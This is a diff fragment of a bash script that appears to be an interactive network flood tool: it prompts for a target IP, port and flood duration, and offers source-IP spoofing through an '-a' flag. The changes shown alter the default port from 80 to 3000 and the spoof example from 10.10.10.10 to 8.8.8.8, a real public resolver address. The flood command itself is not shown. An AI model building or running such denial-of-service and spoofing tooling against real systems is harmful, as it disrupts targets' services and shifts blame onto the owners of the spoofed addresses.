@@ -41,12 +41,12 @@ echo -e "${YELLOW}[?] Enter target IP ${BOLD}(RHOST)${RESET}${YELLOW}:${RESET}"
 read -r TARGET
 
 echo ""
-echo -e "${YELLOW}[?] Enter target port ${BOLD}(default: 80)${RESET}${YELLOW}:${RESET}"
+echo -e "${YELLOW}[?] Enter target port ${BOLD}(default: 3000)${RESET}${YELLOW}:${RESET}"
 read -r PORT
-PORT=${PORT:-80}
+PORT=${PORT:-3000}
 
 echo ""
-echo -e "${YELLOW}[?] How long to run the flood in seconds ${BOLD}(default: 30)${RESET}${YELLOW}:${RESET}"
+echo -e "${YELLOW}[?] How long to run the flood in seconds ${BOLD}(default: 30 seconds)${RESET}${YELLOW}:${RESET}"
 read -r DURATION
 DURATION=${DURATION:-30}
 
@@ -58,7 +58,7 @@ SPOOF_FLAG=""
 FAKE_IP=""
 if [[ "$SPOOF_CHOICE" == "y" || "$SPOOF_CHOICE" == "Y" ]]; then
   echo ""
-  echo -e "${YELLOW}[?] Enter fake source IP ${BOLD}(e.g. 10.10.10.10)${RESET}${YELLOW}:${RESET}"
+  echo -e "${YELLOW}[?] Enter fake source IP ${BOLD}(e.g. 8.8.8.8)${RESET}${YELLOW}:${RESET}"
   read -r FAKE_IP
   SPOOF_FLAG="-a $FAKE_IP"
   echo -e "${GREEN}[✓] IP spoofing enabled — source will appear as ${BOLD}$FAKE_IP${RESET}"
